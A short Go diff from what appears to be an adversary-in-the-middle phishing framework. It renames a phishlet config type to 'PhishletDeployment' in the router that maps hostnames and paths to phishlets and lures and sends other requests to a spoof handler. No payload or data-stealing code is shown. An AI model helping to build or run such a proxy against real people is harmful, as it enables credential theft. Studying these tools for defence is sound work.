@@ -14,7 +14,7 @@ type hostnameChecker interface {
 }
 
 type PhishletResolver interface {
-	ResolveHostname(hostname, urlPath string) (*aitm.PhishletDef, *aitm.PhishletConfig, *aitm.Lure, error)
+	ResolveHostname(hostname, urlPath string) (*aitm.PhishletDef, *aitm.PhishletDeployment, *aitm.Lure, error)
 }
 
 type PhishletRouter struct {
@@ -31,12 +31,12 @@ func (h *PhishletRouter) Handle(ctx *aitm.ProxyContext, req *http.Request) error
 		h.Spoof.ServeHTTP(ctx.ResponseWriter, req)
 		return proxy.ErrShortCircuit
 	}
-	phishletDef, phishletCfg, lure, err := h.Resolver.ResolveHostname(hostname, req.URL.Path)
+	phishletDef, deployment, lure, err := h.Resolver.ResolveHostname(hostname, req.URL.Path)
 	if err != nil {
 		return fmt.Errorf("phishlet_router: resolving %q: %w", hostname, err)
 	}
 	ctx.Phishlet = phishletDef
-	ctx.PhishletCfg = phishletCfg
+	ctx.Deployment = deployment
 	ctx.Lure = lure
 	return nil
 }
